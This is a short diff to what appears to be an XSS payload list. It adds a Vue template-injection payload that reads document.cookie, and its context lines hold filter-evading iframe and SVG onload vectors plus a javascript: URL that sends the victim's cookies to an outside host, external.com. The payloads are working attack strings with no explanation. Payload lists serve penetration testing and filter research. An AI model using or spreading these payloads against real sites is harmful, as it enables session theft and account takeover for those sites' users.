@@ -217,3 +217,4 @@ javascript%3Alocation%2f**%2f=%27https://external.com/?%27%2bdocument.cookie
 <iframe/onload​='this["src"]="javas&Tab;cript​:al"+"ert``"';>
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](origin)%27>
 </h1>%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+{{$emit.constructor\alert(document.cookie)`()}}`
